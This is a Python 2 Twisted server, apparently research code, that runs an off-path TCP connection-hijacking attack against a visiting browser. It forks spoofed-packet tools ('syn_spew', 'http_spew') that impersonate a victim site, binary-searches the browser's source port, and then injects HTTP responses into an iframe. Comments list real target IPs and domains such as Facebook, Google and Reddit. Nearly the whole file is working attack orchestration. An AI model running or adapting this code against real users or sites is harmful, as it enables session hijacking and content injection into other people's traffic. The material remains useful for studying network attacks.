#!/usr/bin/python

# Modified from https://github.com/gtaylor/txWS-example-project/blob/master/src/protocols/websockets.py

from twisted.internet import reactor
from twisted.internet.protocol import Factory, Protocol
from twisted.python import log

import sys
import os
import signal
import subprocess
import time
import random

class WebSocketServerFactory(Factory):
    """
    This is used by twisted.internet.TCPServer to create TCP Servers for each
    port the server listens on.
    """
    def __init__(self, service):
        """
        :attr WebSocketService service: Reference to the top-level service.
        :attr EchoUpper protocol: The protocol this factor spawns.
        """
        self.service = service
        self.protocol = ControlWebSocket
        print "setup websocketserverfactory"

    def buildProtocol(self, addr):
        #return super(WebSocketServerFactory, self).buildProtocol(addr)
        p = self.protocol(addr)
        p.factory = self
        return p


NUM_BUCKETS = 100
LOW_PORT = 32768
HIGH_PORT = 61000
#LOW_PORT = 56300
#HIGH_PORT = 57000

PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / NUM_BUCKETS
TEST_VICTIM_IP = '12.168.1.113'
#VICTIM_SITE = '69.171.242.11' # facebook (can only use on campus)
#VICTIM_SITE = '74.125.225.102' # google (can only use on campus)
#VICTIM_SITE = '66.220.149.11'  # can't use non-umich because merit egress filters

#VICTIM_SITE = '141.212.113.142' # sorry, cse.umich.edu

#VICTIM_SITE = '141.212.109.163' # can't use things with -m state --state ESTABLISHED,RELATED, because it will send RST to SYN-ACK
#VICTIM_SITE_IMG = 'http://%d-x-%d.x.hobocomp.com'


#VICTIM_SITE = '68.40.51.184' # hobocomp.com! (only usable when victim browser is on umich campus due to merit egress filters)
#VICTIM_SITE_IMG = 'http://%d-x-%d.hobocomp.com/'

#VICTIM_SITE = '23.21.237.114'   # factorable.net
#VICTIM_SITE_IMG = 'http://%d-x-%d.f.hobocomp.com/'
#VICTIM_DOMAIN = 'factorable.net'

#VICTIM_SITE = '68.40.51.184'
#VICTIM_DOMAIN = 'hobocomp.com'

#VICTIM_SITE = '192.122.184.99'
#VICTIM_DOMAIN = 'www.reddit.com'

#VICTIM_SITE = '140.254.112.210'
#VICTIM_DOMAIN = 'osu.edu/2008/images/home/sprite2.png'

#VICTIM_SITE = '69.171.228.74'
#VICTIM_DOMAIN = 'www.facebook.com' # TTL = 30

#VICTIM_SITE = '66.220.149.11' #OOPSS!! sorry for spamming this after facebook.com no longer pointed to it...
#VICTIM_SITE = '66.220.149.88'
#VICTIM_DOMAIN = 'facebook.com' # TTL = 7200, but there are 5 of them (and then they added a 6th)

# TODO: loop over all these to figure out which one we are during port
# guessing...
#VICTIM_SITE_IPS = ['66.220.149.88', '66.220.158.11', '69.171.224.37', \
#                    '69.171.229.11', '69.171.242.11']

#VICTIM_SITE = '184.169.195.56'
VICTIM_SITE = '50.18.143.83'
VICTIM_DOMAIN = 'bank.hobocomp.com'
#VICTIM_SITE_IPS = ['50.18.143.83', '184.169.195.56']


#VICTIM_SITE = '65.55.206.154'
#VICTIM_DOMAIN = 'live.com'

#VICTIM_SITE='74.125.142.191'
#VICTIM_DOMAIN='blogspot.com'

#VICTIM_SITE='89.238.130.247'
#VICTIM_DOMAIN='putlocker.com'


NEW_CONNECTION_PERIOD = 0.005
CONNECTION_TIMEOUT = 30.0
SPEW_DELAY_US = '100'
SPEW_TIME_MS  = '500'   # if you don't win the race in the first few seconds, you're not going to
RTT = 50    # milliseconds


STATE_INIT = 1
STATE_SOURCE_PORT_GUESS = 2
STATE_SOURCE_PORT_FINAL = 3
STATE_BW_TEST = 4
STATE_IP_DOUBLE_CHECK = 5

class ControlWebSocket(Protocol):
    """
    The control_sock in page.html - here we issue new commands to the browser,
    such as "make a new websocket to site.com", while we spoof SYN packets from site.com
    to guess the source port the client picked.
    """
    def __init__(self, addr):
        self.addr = addr
        self.calls = 0
        self.spewer_pid = None
        self.max_port = 0
        self.seq_spew_port = None
        print 'control web from %s' % addr

    def spawnSpewer(self, low_port, high_port):
        if self.spewer_pid != None:
            print 'Error: spewer already (still?) running!'
            reactor.stop()

        try:
            self.spewer_pid = os.fork()
            if self.spewer_pid > 0:
                # parent
                return
        except OSError, e:
            print 'Error: %s' % e.strerror
        #self.addr.host = TEST_VICTIM_IP
        #subprocess.call(['./syn_spew', '-p', '%d-%d' % (low_port, high_port), \
        #                 '-r', '100', '-d', '100', self.addr.host, '69.171.242.11:80'])
        #guess_ip = VICTIM_SITE_IPS[self.ip_guess_index]
        guess_ip = VICTIM_SITE
        
        (port_a, port_b) = (low_port, high_port)
        if len(self.votes) > 0:
            (port_b, port_a) = (low_port, high_port)
        os.execvp('./syn_spew', ['./syn_spew', '-b', '-p', '%d-%d' % (port_a, port_b), \
                                '-t', SPEW_TIME_MS, '-d', self.SPEW_DELAY_US, self.addr.host, '%s:80' % (guess_ip)])
        #sys.exit(0)


    def spawnHTTPSpewer(self):
        if self.spewer_pid != None:
            print 'Error: spewer already (still?) running! not starting HTTP'
            reactor.stop()
        
        try:
            self.spewer_pid = os.fork()
            if self.spewer_pid > 0:
                # parent
                return
        except OSError, e:
            print 'Error: %s' % e.strerror
        os.execvp('./http_spew', ['./http_spew', '-p', '%d-%d' % (self.seq_spew_port, self.seq_spew_port), \
                    '-r',  '0', '-d', str(int(self.SPEW_DELAY_US)), self.addr.host, \
                    '%s:80' % (VICTIM_SITE)])

    def getBucketPortRange(self):
        high = LOW_PORT + (self.bucket + 1) * self.PORT_BUCKET_SIZE - 1
        if self.bucket == (self.NUM_BUCKETS - 1):
            high = HIGH_PORT
        low = LOW_PORT + self.bucket * self.PORT_BUCKET_SIZE
        return (int(low), int(high))


    def incrementBuckets(self):
        """
        Increases the bucket range by 1 (or more?)
        TODO: deal with wrap around better - if we wrap, need to search for low
        ports again 
        """
        # since the browser's source port will increment by one each guess,
        # we'll increment here too.
        self.min_port += 1
        self.mid_port += 1
        self.max_port += 1

        if self.max_port > HIGH_PORT:
            self.max_port = HIGH_PORT
        if self.mid_port > HIGH_PORT:
            self.mid_port = HIGH_PORT



    def make_iframe(self):
        self.transport.write('iframe')
        if (self.spewer_pid == None):
            self.spawnHTTPSpewer() 
        if (time.time() - self.last_init_iframe) < 15:
            reactor.callLater(float(self.RTT*2.5)/1000, self.make_iframe)
        else:
            # reset the whole thing, try again
            self.bucket = 0
            self.bucket_search = True
            self.state = STATE_SOURCE_PORT_GUESS
            self.seq_spew_port = None
            self.killSpewer()
            self.num_tries += 1
            self.transport.write("tries %d" % self.num_tries)

            reactor.callLater(1, self.fireAgain)

    def init_iframe(self):
        self.transport.write("init_iframe http://%s/index.html" % (VICTIM_DOMAIN))
        self.last_init_iframe = time.time()                
        reactor.callLater(1, self.make_iframe)


    def adjustBucket(self, success):
        """
        Given the current bucket (self.min_port - self.mid_port), was the browser's source port in there?
        If it was, we'll look in the lower half of that range next, 
        otherwise, it was in self.mid_port - self.max_port

        If the size of our new port bucket is small enough (e.g. fewer than
        5 ports), we will just repeatedly guess the maximum (without calling
        incrementBuckets) until we "win".
        """

        #self.calls += 1
        if (self.calls > 25):
            print 'yikes, 25 calls...quitting'
            reactor.stop()
            return

        print 'adjust Bucket (%s, %s, %s) (%s)' % (self.min_port, self.mid_port, self.max_port, success)

        if (self.state == STATE_SOURCE_PORT_FINAL):
            if success:
                port = self.min_port
            else:
                self.wrong_final_count += 1
                if (self.wrong_final_count >= 5):
                    # oops, browser must have skipped this port..
                    self.state = STATE_SOURCE_PORT_GUESS
                    self.min_port = int(self.min_port)
                    self.max_port = int(self.min_port) + 40
                    self.mid_port = int(self.min_port) + 20
                return

            print 'Found port %d used for %s' % (port + 1, VICTIM_SITE)
            self.transport.write("Found port <b>%d</b> for %s" % (port + 1, VICTIM_SITE)) 

            self.seq_spew_port = port + 1
            reactor.callLater(0.5, self.init_iframe)

            return

        if success:
            # Look left
            self.min_port = int(self.min_port)
            self.max_port = int(self.mid_port)
            self.mid_port = int((self.min_port + self.mid_port) / 2)
        else:
            # if we are really close (min==mid), when we lose, 
            # we should increase the max by one
            self.min_port = int(self.mid_port)
            self.mid_port = int((self.mid_port + self.max_port) / 2)
            self.max_port = int(self.max_port)
            if (self.min_port == self.mid_port):
                self.mid_port += 1
                self.max_port += 1

            # chrome weirdness, when you lose, it skips a port
            # (something to do with Linux source port hints?)
            #self.min_port += 1
            #self.mid_port += 1
            #self.max_port += 1

        # When we reach a small enough guessing range, it makes less sense to do
        # binary search, and just guess a single value until we get a hit
        # (5 is probably not the right number, we could make some models and
        # figure out what the optimal number is given our flavor of binary search,
        # but i'll optimize when i'm dead)
        if (self.max_port - self.min_port) < 5:
            print 'Starting to just guess %d' % self.max_port
            self.min_port = self.mid_port = self.max_port
            self.state = STATE_SOURCE_PORT_FINAL
            self.wrong_final_count = 0  # if this gets above 5, we've
                                    # missed the port, and we'll have to
                                    # expand our search again
        else: 
            self.incrementBuckets()

        


    def cleanupOldWebsocket(self):
        #subprocess.call(['./syn_spew', '-R', '-p', '%d-%d' % (self.min_port, self.mid_port), \
        #                 '-r', '3', '-d', SPEW_DELAY_US, self.addr.host, '%s:80' % (VICTIM_SITE)])
        #print 'done'

        if self.bucket_search:
            # now we will use binary search
            self.bucket_search = False
    
            (self.min_port, self.max_port) = self.getBucketPortRange() 
            self.mid_port = int((self.min_port + self.max_port) / 2)
        else:
            print 'cleanupOldWebsocket binary search'
            self.adjustBucket(True)
       
        if (self.seq_spew_port == None): 
            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)
 

    def websocketTimeout(self):
        """
        Haven't heard back from websocket in a while, maybe this bucket won?!
        """

        #self.websocketTimeoutCb = None  # ha, we win
        print 'websocket timeout, killing... (%d-%d)' % (self.min_port, self.mid_port)

        if self.spewer_pid != None:
            os.kill(self.spewer_pid, signal.SIGKILL)
            self.spewer_pid = None

        #self.transport.write("kill") # kill the current websocket, so that it will try to make a new one in a bit

        reactor.callLater(NEW_CONNECTION_PERIOD, self.cleanupOldWebsocket)
       

    def fireAgain(self, url=VICTIM_SITE):
        """
        start constructing and spewing syn packets to victim
        """

        if self.bucket_search:
            (self.min_port, self.mid_port) = self.getBucketPortRange()
        
        #print 'firing %d-%d (%d)' % (self.min_port, self.mid_port, self.max_port)

        self.spawnSpewer(self.min_port, self.mid_port)

        testing = "testing"
        if self.bucket_search:
            testing = "(bucket) testing"
        self.transport.write("show <b>%s %s:%d - %d...</b>" % \
            (testing, VICTIM_SITE, self.min_port, self.mid_port))
        self.transport.write("make ws://%s/" % (url))
        #self.transport.write("img %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy.

        self.fire_time = time.time()

        # no need to call websocketTimeout, since client javascript will time itself out
        #self.websocketTimeoutCb = reactor.callLater(CONNECTION_TIMEOUT, self.websocketTimeout)
        

    def killSpewer(self):
        # Kill spewer, whatever you do! (This is NOT the kind
        # of process you want to leave running if you can help it...)
        if self.spewer_pid != None:
            os.kill(self.spewer_pid, signal.SIGKILL)
            self.spewer_pid = None

    def handlePortDetectionResult(self, data):
        # When we are still trying to determine what source port a client is
        # using. This function determines what our next guesses should be,
        # given the current information.
        # either we won/lost the race ("timeout"/"closed"), 
        if not(data.startswith('closed') or data.startswith('timeout')):
            return

        if data.startswith('closed'):
            we_won = False
            diff = float(data[len('closed '):])
            print 'Lost the race %f' % diff
        else:
            we_won = True
            diff = float(data[len('timeout '):])
            print 'Won the race %f' % diff

        if (self.state == STATE_IP_DOUBLE_CHECK):
            # Since we're only checking one port, this should be really fast.
            # since we don't know the IP, we can't rely on the browser's RTT 
            # threshold, so we just set an arbitrary 35ms here. FIXME?
            we_won = (diff < 0.035)

        self.killSpewer()

        if self.bucket_search:

            self.votes.append(we_won)

            if len(self.votes) >= 2:
                # count the votes, and use this result to move on
                if True in self.votes:
                    # we won at least one race. Assume our 
                    # false-positive rate (winning a race we shouldn't have)
                    # is much less than our false-negative rate (losing when
                    # we should have won, e.g. dropped packet etc)
                    we_won = True
                else:
                    we_won = False
                self.votes = []

                if (we_won):
                    # now we will use binary search
                    self.bucket_search = False
    
                    (self.min_port, self.max_port) = self.getBucketPortRange() 
                    self.mid_port = (self.min_port + self.max_port) / 2
                else:
                    # we lost, so we're
                    # still doing a linear search over buckets
                    self.bucket += 1
                    if (self.bucket == self.NUM_BUCKETS):
                        print 'Ah, well that is the game :(...trying again...'
                        #self.ip_guess_index += 1
                        #self.ip_guess_index %= len(VICTIM_SITE_IPS)
                        self.bucket = 0
                        #print 'But wait, there\'s more! (index %d' % self.ip_guess_index 

        elif (self.state == STATE_SOURCE_PORT_FINAL or self.state == STATE_IP_DOUBLE_CHECK):
            self.adjustBucket(we_won)
        else:
            # Doing binary search
            self.votes.append(we_won)
            if len(self.votes) >= 2:
                we_won = (True in self.votes)
                self.votes = []
                self.adjustBucket(we_won)
            else:
                self.incrementBuckets()

        # Fire again
        if (self.fire_time != None):
            print 'diff: %f' % (time.time() - self.fire_time)
            
        if (self.seq_spew_port == None):
            reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)

    def handleRTTResult(self, data):
        # the browser has finished measuring the RTT (and win_threshold)
        print 'RTTResult: %s' % data
        rtt_secs = float(data[len('calmed '):])
        self.RTT = int(rtt_secs * 1000)
        print 'RTT: %f (%d ms)' % (rtt_secs, self.RTT)
        # The browser has initialized itself and is ready to begin bucket search
        # But first, we'll do a quick bandwidth test
        # make the browser download a 10mb file from us and time how long it took
        # to get it. That gives us a speed at which we can send packets at
        if (self.fire_time != None):
            print 'diff: %f' % (time.time() - self.fire_time)

        self.transport.write("bwtest 50mb.dat.jpg")
        self.state = STATE_BW_TEST

  
    def handleBWResult(self, data):
        # We use the bandwidth result to determine how many
        # packets per second we can spew at the browser.
        bwresult = float(data[len('bwresult '):])
        print 'Took %f seconds to download 10MB' % bwresult
        bw = float(8*10*1024*1024) / bwresult
        pps = bw / float(480)
        pkt_delay = int(1000000.0 / pps)
        print '%f mbps \n~= %f kpkts/sec \n~= %d us packet delay' % \
            ((bw/float(1024*1024)), (pps/float(1000)), pkt_delay)
        
        self.SPEW_DELAY_US = str(pkt_delay + 10)
    
        # now calculate the other way:
        pps = 1000000.0 / float(self.SPEW_DELAY_US) #packets per second
        pps /= 2 # have to send both SYN and RST


        self.transport.write('bwres <b>%f mbps<br/>~= %f kpkts/sec<br/>~= %s us packet delay</b>' % \
            ((bw/float(1024*1024)), (pps/float(1000)), self.SPEW_DELAY_US))

        port_guesses = float(pps * self.RTT) / 1000.0   # number of ports we can guess per RTT

        port_guesses *= 0.8  # fudge factor
        
        
        self.NUM_BUCKETS = int((HIGH_PORT - LOW_PORT) / port_guesses + 1)
        self.NUM_BUCKETS = max(self.NUM_BUCKETS, 15)
        self.PORT_BUCKET_SIZE = (HIGH_PORT - LOW_PORT) / self.NUM_BUCKETS
        print 'moving to %d buckets' % self.NUM_BUCKETS
        


        self.state = STATE_SOURCE_PORT_GUESS
        self.votes = []  # We will append to this a set of win/loss (True/False)
                         # until we get above VOTE_THRESHOLD, then move on to the
                         # next bucket, to increase reliability.
        reactor.callLater(NEW_CONNECTION_PERIOD, self.fireAgain)



    def dataReceived(self, data):
        # Received data from the control websocket
        # 
        if self.state == STATE_SOURCE_PORT_GUESS or \
           self.state == STATE_SOURCE_PORT_FINAL or \
           self.state == STATE_IP_DOUBLE_CHECK:
            self.handlePortDetectionResult(data)

        elif self.state == STATE_INIT:
            self.handleRTTResult(data)

        elif self.state == STATE_BW_TEST:
            self.handleBWResult(data)



    def connectionMade(self):
        self.bucket_search = True
        self.bucket = 0
        self.num_tries = 0
        
        # Tell that browser to open a connection to get rid of the "Chrome opens 5-50 connections
        # for whatever reason when first asked, then calms down and only opens 1
        # (or 2, you never know) to it next time.
        self.fire_time = time.time()
        self.state = STATE_INIT
        self.ip_guess_index = 0  # index into VICTIM_SITE_IPS[]
        self.transport.write("calm ws://%s/" % (VICTIM_SITE)) 
        #self.transport.write("calm %s" % (VICTIM_SITE_IMG % (random.randint(0,10000000), random.randint(0,10000000)))) # toodo: just increment, birthday-attack boy. 
